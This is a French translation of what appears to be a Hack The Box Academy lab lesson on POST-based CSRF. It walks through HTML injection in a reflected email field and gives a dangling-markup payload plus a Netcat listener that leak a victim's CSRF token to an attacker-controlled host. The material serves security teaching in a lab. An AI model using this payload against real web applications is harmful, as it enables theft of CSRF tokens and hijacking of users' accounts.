Cross-Site Request Forgery (basée sur POST)
===========================================

La grande majorité des applications effectuent aujourd'hui des actions via des requêtes POST. Par la suite, les jetons CSRF résideront dans les données POST. Attaquons une telle application et essayons de trouver un moyen de divulguer le jeton CSRF afin de pouvoir monter une attaque CSRF.

Allez à la fin de cette section et cliquez sur `Click here to spawn the target system!`ou sur l' `Reset Target`icône . Utilisez la Pwnbox fournie ou une machine virtuelle locale avec la clé VPN fournie pour atteindre l'application cible et suivez-la. N'oubliez pas de configurer le vhost ( `csrf.htb.net`) spécifié pour accéder à l'application.

Accédez `http://csrf.htb.net`à l'application et connectez-vous à l'aide des informations d'identification ci-dessous :

-   Courriel : heavycat106
-   Mot de passe : rocknrol

Il s'agit d'un compte que nous avons créé pour examiner les fonctionnalités de l'application.

Après vous être authentifié en tant qu'utilisateur, vous remarquerez que vous pouvez supprimer votre compte. Voyons comment voler le jeton CSRF de l'utilisateur en exploitant une vulnérabilité d'injection HTML/XSS.

Cliquez sur le bouton "Supprimer". Vous serez redirigé vers`/app/delete/<your-email>`

![image](https://academy.hackthebox.com/storage/modules/153/36.png)

Notez que l'e-mail est reflété sur la page. Essayons de saisir du code HTML dans la valeur *de l'e-mail* , par exemple :

Code : html

```
<h1>h1<u>underline<%2fu><%2fh1>

```

![image](https://academy.hackthebox.com/storage/modules/153/37.png)

Si vous inspectez la source ( `Ctrl+U`), vous remarquerez que notre injection se produit avant un `single quote`. Nous pouvons en abuser pour divulguer le jeton CSRF.

![image](https://academy.hackthebox.com/storage/modules/153/39.png)

Commençons par demander à Netcat d'écouter sur le port 8000, comme suit.

```
dsgsec@htb[/htb]$ nc -nlvp 8000
listening on [any] 8000 ...

```

Nous pouvons maintenant obtenir le jeton CSRF en envoyant la charge utile ci-dessous à notre victime.

Code : html

```
<table%20background='%2f%2f<VPN/TUN Adapter IP>:PORT%2f

```

Tout en restant connecté en tant que Julie Rogers, ouvrez un nouvel onglet et visitez `http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f<VPN/TUN Adapter IP>:8000%2f`. Vous remarquerez qu'une connexion est établie qui fuit le jeton CSRF.

![image](https://academy.hackthebox.com/storage/modules/153/40.png)

Étant donné que l'attaque a réussi contre notre compte de test, nous pouvons faire de même contre n'importe quel compte de notre choix.

Nous vous rappelons que cette attaque ne nécessite pas que l'attaquant réside dans le réseau local. L'injection HTML est utilisée pour divulguer le jeton CSRF de la victime à distance !

Ensuite, nous verrons comment vous pouvez enchaîner XSS et CSRF pour attaquer la session d'un utilisateur.
